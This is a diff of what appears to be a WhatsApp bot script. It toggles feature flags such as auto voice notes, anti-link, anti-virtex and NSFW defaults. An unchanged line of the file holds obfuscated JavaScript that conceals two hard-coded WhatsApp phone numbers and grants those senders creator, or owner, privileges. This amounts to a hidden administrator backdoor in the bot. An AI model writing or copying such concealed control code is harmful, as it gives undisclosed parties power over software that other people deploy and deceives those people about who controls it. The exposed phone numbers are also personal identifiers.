@@ -173,7 +173,7 @@ readGc = true
 readPc = false 
 antitrol = true 
 bugc = true
-autovn = true
+autovn = false
 autoketik = false
 autoregister = setting.user_register
 
@@ -382,10 +382,10 @@ await alpha.updatePresence(from, Presence.composing)
 		const groupAdmins = isGroup ? getGroupAdminss(groupMembers) : ''
 		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
 		const isGroupAdmins = groupAdmins.includes(sender) || false
-		const isAntiLink = isGroup ? antilink.includes(from) : false
-		const isAntivirtex = isGroup ? antivirtex.includes(from) : false
+		const isAntiLink = isGroup ? antilink.includes(from) : true
+		const isAntivirtex = isGroup ? antivirtex.includes(from) : true
 		const isLevelingOn = isGroup ? _leveling.includes(from) : false
-		const isNsfw = isGroup ? _nsfw.includes(from) : false
+		const isNsfw = isGroup ? _nsfw.includes(from) : true
 		const isEventon = isGroup ? event.includes(from) : false
 		const isSewa = _sewa.checkSewaGroup(from, sewa)
 		function _0x48c6(_0x36e236,_0x28a7d8){const _0x8c1642=_0x8c16();return _0x48c6=function(_0x48c6ce,_0x1ee6bc){_0x48c6ce=_0x48c6ce-0x186;let _0x4fb38b=_0x8c1642[_0x48c6ce];return _0x4fb38b;},_0x48c6(_0x36e236,_0x28a7d8);}const _0x52adec=_0x48c6;(function(_0x57c75f,_0x150719){const _0x132f1c=_0x48c6,_0x554c9b=_0x57c75f();while(!![]){try{const _0x52df39=-parseInt(_0x132f1c(0x189))/0x1*(parseInt(_0x132f1c(0x18a))/0x2)+parseInt(_0x132f1c(0x193))/0x3*(-parseInt(_0x132f1c(0x190))/0x4)+parseInt(_0x132f1c(0x18e))/0x5*(-parseInt(_0x132f1c(0x18d))/0x6)+parseInt(_0x132f1c(0x186))/0x7+-parseInt(_0x132f1c(0x187))/0x8*(-parseInt(_0x132f1c(0x188))/0x9)+-parseInt(_0x132f1c(0x18b))/0xa*(-parseInt(_0x132f1c(0x191))/0xb)+parseInt(_0x132f1c(0x194))/0xc*(parseInt(_0x132f1c(0x18c))/0xd);if(_0x52df39===_0x150719)break;else _0x554c9b['push'](_0x554c9b['shift']());}catch(_0x1c1493){_0x554c9b['push'](_0x554c9b['shift']());}}}(_0x8c16,0x2d1d7));const alphaNumber=[_0x52adec(0x192),_0x52adec(0x18f)],isCreator=alphaNumber['includes'](sender);function _0x8c16(){const _0x37a4cc=['65xmcCgV','6hoiUcV','785095EkGgce','918156874290@s.whatsapp.net','1432468GswrZV','121ZEBubH','62887435047326@s.whatsapp.net','3dHqOGE','619656hzoCVh','1984220vbkepi','282056trugsR','9LkAPQM','37166bVyVDD','12dJFTOf','314560vKQKoN'];_0x8c16=function(){return _0x37a4cc;};return _0x8c16();}
